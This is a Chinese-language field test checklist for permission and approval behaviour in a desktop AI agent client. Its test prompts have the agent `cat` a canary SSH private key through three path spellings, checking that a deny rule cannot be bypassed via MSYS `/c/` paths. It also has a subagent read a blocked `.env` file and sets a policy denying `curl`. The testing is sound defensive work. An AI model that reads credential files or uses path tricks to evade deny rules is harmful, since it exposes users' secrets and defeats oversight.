# T033 自测分片 04 · MODEL 组（真实模型回合，50 项）

Role: self-test shard（给现场自测的人用，一个人从头做到尾，不需要中途问编排器）。
上位：[T033 上机日执行单](../../t033-field-day-runbook.md) · 编排器版分片 [04-model.md](../04-model.md)。
判据权威：[checklist-e.md](../../../checklist-e.md) 第 4 节 real-model 表 + 第 2 节 MODEL-39～50 + 5.1 判据更正。
**本文件不改写判据**，每一项的「看什么」都是从检查单逐字搬过来的（MODEL-49 用 5.1 更正后的版本）；本文件只负责把判据拆成能照着做的步骤。

## 这份清单怎么用

1. 从上到下按轮次做。每一轮内**【必】的项排在前面**，同一轮里能连着做的项会写明「同一会话继续」。
2. 每项只有三种收尾：
   - ✅ 通过（挂证据文件）
   - ⛔ 不通过 / 与判据不符（挂证据文件 + 一句你看到的现象）
   - 🚫 没做（写明为什么：缺前提、缺样本、打包态取不到、时间不够）
   **不接受只写「通过」。**
3. 现场与判据不符时**以现场为准**：照实记，别帮它圆。
4. 做完把最后一节的「结果表」填满，连同 `C:\t033\evidence\model\` 整个目录一起回传。

**分档说明**（决定时间不够时砍哪些）：

| 档 | 含义 | 本组项数 |
|---|---|---|
| 【必】 | 执行单 §6「34 条必做」映射到 MODEL 编号的行，不做就不能签收 | 30 |
| 【绿】 | 执行单 §7 第二刀：让旧树 P5-2 / P5-4 / P5-5 的节点能转绿 | 8 |
| 【探】 | 执行单 §7 第三刀：纯探索，时间不够可整组砍，但砍了要写一行「🚫 当天未做，原因：时间」 | 12 |
| 【不做】 | 已结案 / 已裁决不需人工执行 | **0（本组没有这一档）** |

**贴回纪律**：每段输出以编号开头（先写 `MODEL-28:` 再换行贴原文）；贴原文不要总结；
**涉及密钥的输出（MODEL-9 / MODEL-10）贴回前先打码，只保留前 4 位**（例如 `sk-p…（已打码）`）；
任何时候都不要贴 `auth.json` / `vault.json` 的内容。

---

## 0. 开工前一次性准备

这一节做一遍，后面每一轮都直接用。

### 0.1 变量与目录（每开一个新的 PowerShell 窗口都先跑这一段）

```powershell
$app      = "$env:LOCALAPPDATA\Programs\AiClient"          # 安装目录
$node     = "$app\resources\node-runtime\node.exe"          # 随包 Node（实测 v24.18.0）
$ev       = 'C:\t033\evidence\model'                        # 本组证据根
$trace    = 'C:\t033\trace'                                 # trace 落盘目录
$ws       = 'C:\t033\ws'                                    # 本组用的工作区
$state    = "$env:USERPROFILE\.pilab\jyw-ai-client"         # 应用状态根
$agent    = "$state\pi-agent"                               # models.json / auth.json / sessions
$userData = "$env:APPDATA\jyw-ai-client"                    # session-index.json / logs / 导入清单
New-Item -ItemType Directory -Force -Path $ev, $trace, $ws, 'C:\t033\outside' | Out-Null
. C:\t033\t033-helper.ps1     # 总纲的辅助脚本：Start-AiClient / Stop-AiClient / Get-Trace / Get-AiClientTree / Get-Head16 / Save-Evidence
& $node -v                    # 期望 v24.x；不是就说明路径不对
```

> 本分片里的每条命令都写成**不依赖 helper 也能跑**的形式。helper 用着顺手就用，用不惯就照抄命令。

### 0.2 每次启动应用的固定姿势

```powershell
$env:AICLIENT_RUNTIME_TRACE_DIR = 'C:\t033\trace'
& "$app\AiClient.exe"
```

- **trace 只有设了 `AICLIENT_RUNTIME_TRACE_DIR` 才落盘**成 `runs.jsonl`（`src/runtime/flags.ts:33,49-55`）。忘了设，所有「抓 trace 的某某行」的项都拿不到证据。
- 变量只对**这个 PowerShell 窗口后续启动的应用**生效。从开始菜单、桌面图标点开的那次**没有 trace**。
- 用 helper 的话：`Start-AiClient` / `Stop-AiClient`。

### 0.3 怎么从 trace 里取证据行

把下面这个函数粘进 PowerShell（每个新窗口粘一次），后面各项直接调用：

```powershell
function Save-TraceRows([string]$Pattern, [string]$OutFile) {
  Get-ChildItem 'C:\t033\trace' -Filter 'runs*.jsonl' | Sort-Object Name |
    ForEach-Object { Get-Content $_.FullName } |
    Select-String -Pattern $Pattern | ForEach-Object { $_.Line } |
    Out-File -Encoding utf8 $OutFile
  Write-Host "wrote $OutFile"
}
```

- `-Filter 'runs*.jsonl'` 天然把 `runs.rotate.lock` 排除在外（执行单 §9 点名要过滤的就是它）。
- **权限审计行**的 pattern 用 `permission_`：trace 里是 `{"event":"permission_<阶段>", ... ,"resolution":"..."}`，
  `resolution` 的取值只有这几种（`src/runtime/plugins/permissions/activity.ts:31-43`）：
  `policy_allow` / `policy_deny` / `session_grant` / `user_approved` / `user_denied` / `timed_out` / `cancelled` / `gate_error`。
- trace 是一个目录里所有会话混写的，所以**每项开始前记一下当前时间**（`Get-Date -Format 'HH:mm:ss'`），判读时好对上。

### 0.4 界面语言、后端、审批界面长什么样

1. 设置页把界面语言设为**中文**（执行单 §3 的 P3；PERM-1 探针的选择器写死中文正则，另有 5 项判据本身就是中文文案）。
2. **打包态的后端恒为 native**：`src/runtime/flags.ts:45` 把 `backend` 写成常量 `'native'`，P6-5 之后只剩一个引擎，**没有任何环境变量能切回 legacy**。
3. 所以审批一定是**结构化中文权限卡**：有「高风险」徽标、倒计时，按钮是「直接允许 / 本会话内允许 / 直接拒绝」（词条见 `src/shared/i18n.ts:70,72,2529,2540`）。
4. 如果你看到的是英文 `Permission Required` 弹窗（那是 pi 插件自己的 legacy 界面），**这本身就是异常**：截图、记 ⛔、写清哪一项上出现的。
5. 每一项的记录里写一句「这一轮命中的是哪一种审批界面」。

### 0.5 工作区与哨兵文件

```powershell
Set-Content -Path "$ws\alpha.ts"  -Value "export const marker = 'T033-SENTINEL-A';" -Encoding UTF8
Set-Content -Path "$ws\beta.ts"   -Value "// T033-SENTINEL-B`r`nexport const two = 2;" -Encoding UTF8
Set-Content -Path "$ws\readme.md" -Value "T033 工作区" -Encoding UTF8
Set-Content -Path "C:\t033\outside\note.txt" -Value 'T033-OUTSIDE-CANARY' -Encoding UTF8
git init $ws          # MODEL-49 的对照命令 `git status` 需要它是个仓库
cd $ws; git add -A; git -c user.email=t033@local -c user.name=t033 commit -m "t033 base" | Out-Null
```

在应用里**用 `C:\t033\ws` 开一个工作区**，本组绝大多数会话都在它下面跑。

### 0.6 怎么开 DevTools、怎么读事件流

- 打开：菜单栏 **视图 → `Developer Tools`**，或快捷键 **Ctrl+Alt+I**（`src/main/services/MenuBuilder.ts:96-99`，打包态同样注册；`Developer Tools` 这一条没进中文词典，菜单里就是英文）。
- **能用的**：`window.electronAPI.*`（preload 通过 contextBridge 暴露的整套 IPC，`chat` / `piTui` / `legacyImport` 等 40 个命名空间）、普通 DOM 查询。
- **不能用的**：`import('/stores/chatSessions.ts')` 这种读渲染层 store 的写法**只在 dev 模式有效**（它依赖 Vite dev server）。打包态没有 dev server，store 也没挂到 `window` 上，**读不到 store**。判据里写「必要时用 devtools 读 store」的项，改用下面的事件流或 DOM 截图取证，并在记录里写明这一点。
- **订阅运行时事件**（权限卡、问答卡、usage 都走这条）。在 Console 里粘：

```js
(() => { window.__t033 = []; window.__t033stop = window.electronAPI.chat.onRuntimeEvent(e => window.__t033.push({ at: new Date().toISOString(), type: e.type, payload: e.payload })); return 'subscribed'; })()
```

  取回来：

```js
copy(JSON.stringify(window.__t033, null, 2))      // 进剪贴板
```

  再在 PowerShell 里落盘：

```powershell
Get-Clipboard | Out-File -Encoding utf8 "$ev\model-28-events.json"
```

  停止订阅：`window.__t033stop()`。

### 0.7 会话文件在哪

```powershell
# 最近写过的三个会话 JSONL（本组很多项要读它）
Get-ChildItem -Recurse -Filter *.jsonl "$agent\sessions" |
  Sort-Object LastWriteTime -Descending | Select-Object -First 3 FullName, LastWriteTime
```

- 写锁是同目录的 sidecar：`<会话 jsonl 全路径>.writer.lock`。
- 会话索引：`$userData\session-index.json`。
- 导入清单：`$userData\legacy-import-manifest.json`；导入暂存目录：`$agent\sessions\.aiclient-import-staging\`。

### 0.8 证据命名

全部放 `C:\t033\evidence\model\`，命名 `model-<两位编号>-<短横线英文 slug>.<扩展名>`，例如 `model-49-pipe-audit.txt`。
每项的「记录」里已经给了文件名，照抄即可。

---

## 轮 M-a · 渲染层词汇表 13 项（MODEL-11 ～ MODEL-23，全部【必】）

这 13 项验的是「界面上的词有没有翻对、有没有该出现的东西」。**全部需要真实回合出图。**
建议开一个会话（工作区 `C:\t033\ws`、界面中文、权限档保持默认的「执行 · 每次询问」）连着做 MODEL-11 → MODEL-14，
后面几项各自需要不同前提，按项内说明办。

### MODEL-11 native grep / glob 行的命中列表 【必】

**准备**：0.5 已经在 `C:\t033\ws` 里放了两个含 `T033-SENTINEL` 的 `.ts` 文件。

**操作**：

1. 在 `C:\t033\ws` 工作区新建一个对话。
2. 发这条提示词：「在这个工作区里用 grep 搜 `T033-SENTINEL`，再用 glob 找出所有 `.ts` 文件。两个工具都要真的调用，不要只描述。」
3. 等两条工具行出现在时间线上。
4. 鼠标**悬停**在 grep 那一行上，截图。
5. 在悬停出来的内容里**点一条命中**，截图编辑器打开后的样子。

**看什么**（判据逐字）：「修复 chat-tool-01 后，悬停搜索行出现命中列表，点击命中能打开对应文件并跳到行号」。

- 通过：悬停后出现**命中列表**（文件名 + 行），点其中一条，编辑器打开那个文件并且光标/高亮落在对应行号上。
- 不通过：悬停只显示工具名和参数、没有命中列表；或点击没反应；或打开了文件但没跳到行号。

**记录**：`C:\t033\evidence\model\model-11-grep-hover.png`、`model-11-jump.png`。结果表填 ✅/⛔ + 一句现象。

### MODEL-12 工作区外 read 的审批卡 【必】

**操作**（同一会话继续）：

1. 发这条提示词：「读一下 `C:\t033\outside\note.txt`，把它的第一行原样念给我。」
2. 审批卡弹出来后**先截图再作答**。
3. 截完点「直接允许」，确认模型念出了 `T033-OUTSIDE-CANARY`。

**看什么**（判据逐字）：「卡上出现被读取文件的完整路径，而不只是『read — 读取文件内容』」。

- 通过：卡上能看到 `C:\t033\outside\note.txt` 这个完整路径。
- 不通过：卡上只有「read — 读取文件内容」一句、看不出读的是哪个文件。

**记录**：`model-12-outside-read-card.png`。

### MODEL-13 中文界面的工具行参数文案 【必】

**操作**（同一会话继续）：

1. 发这条提示词：「先调用 `new_context` 工具开一个干净的上下文；然后同时派两个子代理，一个数这个工作区里有几个 `.ts` 文件，一个数有几个 `.md` 文件；等两个都返回再把结果汇总给我。」
2. 等时间线上出现 `new_context`、`TaskWait`、`TaskList` 三类行（派子代理会先出 `Task` 行）。
3. 截一张能同时看到这三类行的图。
4. 如果模型死活不调 `new_context`，改用输入框里的 `/compact` 斜杠命令触发压缩，并在记录里写明「压缩行是 /compact 触发的」。

**看什么**（判据逐字）：「`new_context` / `TaskWait` / `TaskList` 三种行全中文，无 `a fresh window` / `delegation(s)` / `running subagents`」。

- 通过：三行的参数部分都是中文（词典里对应的是「一个干净的上下文」「运行中的子 Agent」「全部运行中」，见 `src/shared/i18n.ts:2511-2515`）。
- 不通过：任意一行里还留着 `a fresh window` / `delegation(s)` / `running subagents` 的英文原文。

**记录**：`model-13-tool-rows-zh.png`。

### MODEL-14 技能审批卡的正文标签 【必】

**准备**：造一个技能（随包默认策略里 `'*': 'ask'` 是通用兜底，所以加载技能会弹卡）。

```powershell
$skill = "$env:USERPROFILE\.agents\skills\t033-probe"
New-Item -ItemType Directory -Force -Path $skill | Out-Null
@'
---
name: t033-probe
description: T033 技能审批卡取证用，加载后只回一句话。
---
加载成功后，请只回答这一句：T033-SKILL-LOADED。
'@ | Set-Content -Path "$skill\SKILL.md" -Encoding UTF8
```

**操作**：

1. **重启应用**（技能目录在会话启动时扫描）。
2. 在 `C:\t033\ws` 开一个新对话，发：「加载 `t033-probe` 这个技能，然后照它说的做。」
3. 审批卡弹出来后截图（先截图再作答）。

**看什么**（判据逐字）：「中文界面下标签为『技能』而非 Skill」。

- 通过：卡的正文标签是「技能」。
- 不通过：标签是英文 `Skill`。

**记录**：`model-14-skill-card.png`。

### MODEL-15 MCP 行的三处名字一致 【必】

**准备**：用样本包里的 `slow-mcp-server.mjs` 当真实 MCP 服务器，把握手延时设成 0。

```powershell
$mcp = "$agent\mcp.json"
@"
{
  "mcpServers": {
    "slow-probe": {
      "command": "$($node -replace '\\','\\\\')",
      "args": ["C:\\t033\\field-samples\\slow-mcp-server.mjs", "--delay-ms", "0"],
      "env": {}
    }
  }
}
"@ | Set-Content -Path $mcp -Encoding UTF8
Get-Content $mcp
```

**操作**：

1. 重启应用，开一个新对话，等侧栏 MCP 徽标变成已连接。
2. 发这条提示词：「派一个子代理去调用 `slow_echo` 这个 MCP 工具，参数给 `hello`；它返回后把原文告诉我。」
3. 等时间线出现 MCP 工具行，同时打开子代理面板与 Run 面板。
4. **一屏内**把三处一起截下来。

**看什么**（判据逐字）：「时间线、子代理面板表头、Run 面板芯片都显示 `server · tool`，没有 `mcp__` wire 名」。

- 通过：三处显示的都是 `slow-probe · slow_echo`。
- 不通过：任意一处显示成 `mcp__slow-probe__slow_echo` 之类的 wire 名。

**记录**：`model-15-mcp-three-places.png`。

### MODEL-16 导入会话与 native 会话并列 【必】

**前提**：机器上要有一条**已导入**的 Claude 会话。还没有的话先跳到轮 M-f 的 MODEL-6 把导入做掉（两项共用同一条导入会话），再回来。

**操作**：

1. 打开那条导入的 Claude 会话，让它跑一次 grep：「在当前工作区 grep 一下 `T033-SENTINEL`。」
2. 再打开一个 native 会话，发同样的提示词。
3. 把两个会话的搜索行**并排**截图（左右分屏或前后两张都行，两张要能看出是同一屏设置）。

**看什么**（判据逐字）：「同一窗口里导入的 Claude 会话与 native 会话的搜索行表现一致（都有/都没有命中列表）」。

- 通过：两边**一致**——要么都有命中列表，要么都没有。
- 不通过：一边有、另一边没有。

**记录**：`model-16-imported-vs-native.png`。

### MODEL-17 审批后 Run 面板状态 【必】

**操作**（native 会话即可）：

1. 发：「在这个工作区里新建一个文件 `run-panel.txt`，内容写 `T033`。」
2. 审批卡弹出时，**先看 Run 面板标题并截图**（这时应是「等待审批」，词条 `src/shared/i18n.ts:2269`）。
3. 点「直接允许」。
4. 再截一次 Run 面板。

**看什么**（判据逐字）：「点『允许』之后，Run 面板标题从『等待审批』变为『运行中 / 正在运行工具』，attention 色消失」。

- 通过：标题变成「运行中」或「执行工具」，那个提醒色（橙/黄的强调色）消失。
- 不通过：标题不变，或提醒色一直挂着。

**记录**：`model-17-run-panel-before.png`、`model-17-run-panel-after-allow.png`。

### MODEL-18 上下文徽标在委派后仍在 【必】

**操作**：

1. 发：「派一个子代理把工作区里的 `.ts` 文件逐个读一遍并总结。」
2. **第一次**让它自然结束，结束后截输入框上方的百分比徽标。
3. 同一会话再发一次同样的话，这次**中途点停止**（`[aria-label="Stop the running turn"]` 那个按钮），截同一处徽标。
4. 想对照事件流的话，先按 0.6 订阅事件，回合结束后在 Console 里跑：
   `copy(JSON.stringify(window.__t033.filter(e => e.type === 'usage.updated').slice(-1), null, 2))`
   再用 `Get-Clipboard | Out-File -Encoding utf8 "$ev\model-18-usage-updated.json"` 落盘。

**看什么**（判据逐字）：「一次用到 Task 的对话，正常结束与中途 Stop 两种收尾下，输入框上方的百分比徽标都不消失」；
对照项是「devtools 里最后一条 `usage.updated` 的键集是否含 `context`」。

- 通过：两种收尾后徽标都还在，并且最后一条 `usage.updated` 的 payload 里有 `context` 这个键。
- 不通过：任一种收尾后徽标消失了，或 `usage.updated` 里没有 `context`。

**记录**：`model-18-badge-normal.png`、`model-18-badge-stopped.png`、`model-18-usage-updated.json`。

### MODEL-19 并发问答 【必】

**操作**：

1. 在会话 A 发：「用 `ask` 工具问我一个问题：本次点验的证据文件用什么后缀命名，给三个选项。不要自己决定。」
2. A 的问答卡出现后**不要作答**，切到会话 B（没有就新建一个），发同样的话。
3. B 的卡出现后，**切回 A**，截图。
4. 回 A 作答（随便选一个），观察 A 的回合能不能自己结束。

**看什么**（判据逐字）：「会话 A 的 ask 未答时在会话 B 触发 ask，切回 A 仍有可作答卡片，且 A 的回合能自己结束」。

- 通过：切回 A 时卡还在、还能点，作答后 A 的回合正常收尾。
- 不通过：A 的卡没了 / 变成不可点 / 作答后回合一直卡着不结束。
- 判据里「必要时用 devtools 直接读 store 的 `pendingQuestion`」这一句在**打包态做不到**（见 0.6），用截图 + 能否点击来判定，并在记录里写明。

**记录**：`model-19-concurrent-ask.png`（切回 A 的那一屏）、`model-19-a-finished.png`。

### MODEL-20 子代理审批行归属 【必】

**准备**：造一个必然撞 deny 的文件（`*.env` 是硬编码 deny，任何用户策略都盖不掉，`src/agent-host/permissionPolicy.mjs:56-57`）。

```powershell
Set-Content -Path "$ws\.env" -Value 'T033_FAKE_TOKEN=not-a-real-secret' -Encoding UTF8
```

**操作**：

1. 发：「派一个子代理去读这个工作区里的 `.env` 文件，把内容告诉我。」
2. 等时间线上出现那条审批（拒绝）行，截图。

**看什么**（判据逐字）：「委派一个会撞 deny 的子代理后，时间线审批行上能读出是哪个子代理」。

- 通过：审批行上带着子代理的名字/身份，一眼能看出这次拒绝是替谁挡的。
- 不通过：行上只有工具和路径，看不出是子代理发起的。

**记录**：`model-20-subagent-approval-row.png`。

### MODEL-21 中文界面审批行用词 【必】

**操作**：

1. 新开一个会话，发：「在这个工作区新建 `grant-a.txt`，内容写 1。」
2. 审批卡上点**「本会话内允许」**。
3. 同一会话再发：「再新建 `grant-b.txt`，内容写 2。」——这次应当不弹卡、直接放行。
4. 在第二条的时间线行上展开**「审批详情」**，截图。

**看什么**（判据逐字）：「中文语言设置下，『本会话内允许』之后的自动放行行不出现英文 session grant」。

- 通过：详情里写的是中文（词典里是「本会话已授权」，`src/shared/i18n.ts:2581`）。
- 不通过：出现英文 `session grant`。

**记录**：`model-21-session-grant-zh.png`。

### MODEL-22 工具进度行 【必】

**操作**：

1. 发：「用 bash 运行：`sleep 90 && echo done`。只运行，不要解释。」（bash 工具默认上限 120 秒，90 秒装得下）
2. 审批卡弹出就点「直接允许」。
3. 命令跑的这 90 秒里**盯着 Run 面板**，每 30 秒截一次图。

**看什么**（判据逐字）：「跑一条 >60s 的 bash，Run 面板是否出现工具自报的进度行（按当前代码应当永不出现，用于确认 chat-event-04）」。

- 预期：**不出现**任何工具自报的进度行（这是确认现状，不是找 bug）。
- 反过来如果真出现了进度行，那是意外，照实记 ⛔ 并截图。

**记录**：`model-22-no-progress-row.png`（跑到一半那张）。

### MODEL-23 回放差异 【必】

**操作**：

1. 找一个**既批过审批、又答过问答**的会话（MODEL-19 那条 A 会话，如果它也批过审批就直接用；没有就在一条会话里先触发一次 write 审批并批准、再触发一次 ask 并作答）。
2. 关闭应用前，截一张完整时间线（能看到审批行和问答卡）。
3. `Stop-AiClient`（或正常关窗退出），按 0.2 重新启动，打开同一条会话。
4. 再截一张同位置的图。

**看什么**（判据逐字）：「一个批过审批、答过问答的会话关掉再打开后，审批行与问答卡是否还在」。

- 记两件事：审批行还在不在、问答卡还在不在（判据是问「是否」，两种结果都要如实记，不是「必须都在」）。

**记录**：`model-23-replay-before.png`、`model-23-replay-after.png`。

---

## 轮 M-b · 权限与问答（MODEL-29 / 28 / 27 / 33+WIN-37）

四项全是【必】。MODEL-29 要源码，先看它的「准备」评估能不能做；做不了就记 🚫 往下走。

### MODEL-29 PERM-1 探针复跑（T001 之后） 【必】

**准备**（缺一不可，缺了就整项记 🚫）：

1. 机器上有 `git`，且能访问本仓（这一步要联网）。把源码拉到 `C:\t033\src\ai-client`，**切到本版包的源码提交 `13e6cdb7`**：

```powershell
New-Item -ItemType Directory -Force -Path C:\t033\src | Out-Null
cd C:\t033\src
git clone <本仓地址> ai-client
cd ai-client
git checkout 13e6cdb7
git log -1 --oneline        # 期望第一段是 13e6cdb7
```

2. **探针本身不需要装依赖**：`scripts/run-perm1-probe.mjs` 只 import `node:fs` / `node:path` / `node:process` 和同目录的 `scripts/h21-cdp.mjs`，后者也只用 Node 内建模块 + Node 22+ 自带的全局 `WebSocket`。随包 `node.exe`（v24）直接能跑，**不用 `pnpm install`、不用 `npm ci`**。
   （要跑 MODEL-24 的 smoke 才需要在 `src/runtime` 里 `npm ci`，那是另一项。）
3. **先备份 2026-09-11 那批旧记录**——探针会把报告和截图写回仓库里的固定目录，同名文件会被直接覆盖：

```powershell
Copy-Item -Recurse "C:\t033\src\ai-client\docs\plantree\plans\runtime-evolution\evidence\p4-6\perm1" `
                   "$ev\perm1-2026-09-11-backup"
Get-ChildItem "$ev\perm1-2026-09-11-backup"    # 确认拷到了再往下
```

**操作**：

1. 关掉正在跑的应用，**带调试端口重新起一份**（探针默认连 9222）：

```powershell
$env:AICLIENT_RUNTIME_TRACE_DIR = 'C:\t033\trace'
& "$app\AiClient.exe" --remote-debugging-port=9222
```

2. 进到主界面，打开 `C:\t033\ws` 的一个会话（要有输入框），确认界面是中文、输入框旁边的权限档触发器显示的是**「执行 · 每次询问」**。
3. 确认调试端口通了：

```powershell
Invoke-WebRequest -UseBasicParsing http://127.0.0.1:9222/json | Select-Object -ExpandProperty Content | Select-Object -First 1
```

4. 跑探针（**接管模式**，不要让它自己起 dev 应用——dev 那条路在这台机器上没有源码依赖跑不起来）：

```powershell
cd C:\t033\src\ai-client
$env:PERM1_ATTACH = '1'
$env:AICLIENT_H21_PORT = '9222'
& $node scripts\run-perm1-probe.mjs
```

5. 探针会自己点权限档弹层、然后**真的发一条消息**（「用 bash 运行这条命令：echo perm-probe-ok」）、等权限卡、点「直接允许」。全程别动鼠标。
6. 跑完把产物拷进证据目录：

```powershell
$p = "C:\t033\src\ai-client\docs\plantree\plans\runtime-evolution\evidence\p4-6\perm1"
Copy-Item "$p\perm1-report.json" "$ev\model-29-perm1-report.json"
Get-ChildItem "$p\perm1-*.png" | ForEach-Object { Copy-Item $_.FullName "$ev\model-29-$($_.Name)" }
Get-Content "$ev\model-29-perm1-report.json" -Raw
```

**看什么**（判据逐字）：「七条判据全通过；权限卡文案经词典而非硬编码；触发器选择器能命中当前 `aria-label`。**复跑前先按 field-05 处理产物命名，避免覆盖 2026-09-11 的记录**」。

- 报告里的 `verdict` 对象是判读入口：**看 `verdict.pass` 是不是 `true`**，同时看 `verdict.notMeasured` 这个数组是不是空的（`null` 表示「这一格没测到」，没测到不算通过）。
- 判据写「七条」，当前脚本实际打印 10 个布尔格（`popupHasAllFourGearsAndModes` / `closesOnPlainGear` / `labelFollowsGear` / `autoKeepsPopupOpen` / `cancelAppliesNothing` / `closesOnModeChange` / `labelFollowsMode` / `resetBackToAsk` / `approvalSurfaceAppeared` / `nativeCardIsChinese`）加 `allowClearedTheRequest`。**把整份 JSON 原样贴回**，让编排器对表，不要自己挑。
- 「触发器选择器能命中当前 `aria-label`」= 探针没有在一开头就报 `no trigger` / 超时；命中了就会有 `labelAfter*` 那几行值。
- 不通过的样子：`pass: false`、某几格是 `false`，或 `failure` 字段里有一条报错原文。
- **做不了就记 🚫**：写清是哪一条前提没满足（没网 / 没 git / clone 不下来 / 调试端口连不上），并把实际报错贴回。

**记录**：`model-29-perm1-report.json`、`model-29-perm1-*.png`（探针自己截的几张）、`perm1-2026-09-11-backup\`（备份目录，证明没覆盖旧记录）。

### MODEL-28 权限卡倒计时走到底 【必】

**准备**：如果要录屏（推荐），先把录屏工具准备好（Win+G 也行）。

**操作**：

1. 新开一个会话，先按 0.6 在 Console 里订阅事件流。
2. 发：「在这个工作区新建 `countdown.txt`，内容写 `T033`。」
3. 权限卡出现后**什么都不要点**，开始录屏或每 20 秒截一次图。
4. 等倒计时走到 0（实现常量是 `PERMISSION_TIMEOUT_MS = 120_000`，即 120 秒，`src/runtime/plugins/permissions/index.ts:18`；判据原文写的是 119 秒，等满 120 秒再判最稳）。
5. 记下卡片最后变成什么状态、这一轮怎么收尾的。
6. 取事件流：

```js
copy(JSON.stringify(window.__t033, null, 2))
```

```powershell
Get-Clipboard | Out-File -Encoding utf8 "$ev\model-28-events.json"
Save-TraceRows 'permission_' "$ev\model-28-audit-rows.txt"
```

**看什么**（判据逐字）：「不响应满 119 秒后自动拒绝，卡片状态变为已拒绝，工具调用按拒绝结算」。

- 通过：倒计时归零后卡片自己变成「已拒绝」，工具没执行（`countdown.txt` 不存在），回合按拒绝继续/结束。
  trace 里那条审计行的 `resolution` 应当是 `timed_out`。
- 不通过：倒计时归零后卡片还留在屏上等你点；或文件居然被写出来了；或回合就此卡死没有终态。

```powershell
Test-Path "$ws\countdown.txt"      # 期望 False
```

**记录**：`model-28-countdown.mp4`（或 `model-28-countdown-<秒数>.png` 几张）、`model-28-events.json`、`model-28-audit-rows.txt`。

### MODEL-27 F5 / GUI C/8 问答卡真机一圈 【必】

**操作**：

1. 新开会话，发：「用 `ask` 工具问我一个问题：本次点验的输出目录用哪一个，给三个选项，每个选项带一句说明。不要自己决定。」
2. 问答卡出现在输入框上方后，**先整张截图**。
3. **第一次走选项**：选一个选项再点 `Continue`，看模型下一句是不是照你选的那个继续。
4. 再发一次同样的提示词，**第二次走 Skip**：卡出现后直接点 `Skip`。
5. 看模型收到 Skip 之后怎么答。

**看什么**（判据逐字）：「模型调 ask → 输入框上方出现可作答卡 → 选项与 Skip 各走一次 → 模型收到对应文本（skip 走『自行选默认并说明』那条）」。

- 通过：走选项时模型明确按你选的那项继续；走 Skip 时模型**自己选了一个默认并说明它选了哪个**——回给模型的原文是
  `The user skipped these questions without answering. Proceed with a reasonable default and say which one you picked.`（`src/runtime/plugins/tools/ask.ts:105`）。
- 不通过：Skip 之后模型再问一遍、或回合直接结束什么都没说、或选项文本没进模型上下文（答非所选）。
- **已知且不判负**：这张卡的固定文案现在整片是英文（`Questions` / `Other…` / `Skip` / `Continue` / `Ctrl + Enter`，缺陷 D20）。这不是本项判据，照实记一句就行。

**记录**：`model-27-question-card.png`、`model-27-option-answered.png`、`model-27-skip.png`。

### MODEL-33 + WIN-37 MSYS 盘符记法是否绕过 `~/.ssh/*` 的 deny 【必】（一轮做完两项）

> 这是本轮**唯一必须在 Windows 落地的 high**：同一条 deny 规则在三种路径拼法下判定必须一致。

**准备**：

```powershell
# 如果你机器上已经有真的 id_ed25519，先备份改名，测完再改回来！
Test-Path "$env:USERPROFILE\.ssh\id_ed25519"
New-Item -ItemType Directory -Force -Path "$env:USERPROFILE\.ssh" | Out-Null
Set-Content -Path "$env:USERPROFILE\.ssh\id_ed25519" -Value 'T033-SSH-CANARY' -Encoding ASCII
$me = $env:USERNAME
"用户名 = $me"
```

**操作**：

1. 在应用里把权限档切到 **auto（全自动）**——判据要的就是「auto 档下会不会被放行」。
2. 记下开始时间：`Get-Date -Format 'HH:mm:ss'`。
3. 同一个会话里**依次**发三条（每条单独发，等上一条结束再发下一条），每条都把模型的完整回复和是否弹卡记下来：

   - 第 1 条（波浪号写法）：「用 bash 运行：`cat ~/.ssh/id_ed25519`。只运行，把输出原样给我。」
   - 第 2 条（原生盘符反斜杠写法）：「用 bash 运行：`cat 'C:\Users\<把这里换成你的用户名>\.ssh\id_ed25519'`。只运行，把输出原样给我。」（**单引号别去掉**，不然 Git Bash 会把反斜杠当转义）
   - 第 3 条（MSYS 的 `/c/` 写法）：「用 bash 运行：`cat /c/Users/<把这里换成你的用户名>/.ssh/id_ed25519`。只运行，把输出原样给我。」

4. 三条跑完抓权限审计行：

```powershell
Save-TraceRows 'permission_' "$ev\model-33-audit-rows.json"
```

5. 把三条的现象写成一份文本（每条一行：弹卡了吗 / 拿到 `T033-SSH-CANARY` 了吗 / 模型怎么说的）：

```powershell
notepad "$ev\model-33-three-spellings.txt"
```

**看什么**（判据逐字）：「三种拼法在同一档位下的判定必须一致：波浪号写法、原生盘符反斜杠写法、MSYS 的 `/c/` 写法。若第三种被放行（auto 档无卡片，或其他档降级成普通 ask 卡）即为复现」。

- 背景（帮你读结果）：`~/.ssh/*` 是**硬编码 deny**，任何档位、任何用户策略都盖不掉（`src/agent-host/permissionPolicy.mjs:61`）。Windows 上先经 `normalizeWindowsPathForm()` 把 `/c/…`、`/cygdrive/c/…`、`\\?\C:\…` 折叠成 `C:\…` 再比对（`src/runtime/plugins/permissions/windows-paths.ts:16-37`）——**T001 修的就是这一层，WIN-37 验的正是它在真机上生效没有**。
- 通过：三条**全部被拒**，都没有返回 `T033-SSH-CANARY`，trace 里三条审计行的 `resolution` 一致（预期 `policy_deny`）。
- 不通过（= 复现 windows-01）：第三条（`/c/` 写法）**返回了哨兵串**，或者它走成了一张普通 ask 卡而另两条是直接拒绝。
- 只要三条判定不一致，不管哪一条不一样，都记 ⛔ 并写清楚是哪一条、差在哪。

**收尾**：把权限档切回「每次询问」；如果第一步备份过真的 `id_ed25519`，**现在改回来**。

**记录**：`model-33-three-spellings.txt`、`model-33-audit-rows.json`。结果表里 MODEL-33 一行，WIN-37 的结论写进同一份文件并在回传时说明（WIN 组结果表里也记一行）。

---

## 轮 M-c · 自定义策略与复杂 shell（MODEL-49）

### MODEL-49 P1-5 真实自定义策略与复杂 shell 【必】

**准备**：

1. 落一份用户自写的策略文件（样例来自[样本包](../../../evidence/batch-e-devbox-2026-09-17/tools/field-samples/README.md) 第 3 节；文件名**必须**是 `config.json`）：

```powershell
$polDir = "$agent\extensions\pi-permission-system"
New-Item -ItemType Directory -Force -Path $polDir | Out-Null
@'
{
  "permission": {
    "bash": { "git status *": "allow", "curl *": "deny" },
    "path": { "*t033-secret.txt": "deny" }
  }
}
'@ | Set-Content -Path "$polDir\config.json" -Encoding UTF8
Copy-Item "$polDir\config.json" "$ev\model-49-policy.json"
```

2. 造哨兵文件（**不要用真机密**）：

```powershell
Set-Content -Path "$ws\t033-secret.txt" -Value 'T033-SECRET-CANARY' -Encoding UTF8
```

3. **重启应用**（策略只在 runtime 启动时读一次），把权限档设为 **ask（每次询问）**。

4. **先确认策略真的被读到了**，否则后面三条命令的结论全是假的：

```powershell
Save-TraceRows 'permission_policy_s' "$ev\model-49-policy-stamp.txt"
Get-Content "$ev\model-49-policy-stamp.txt"
```

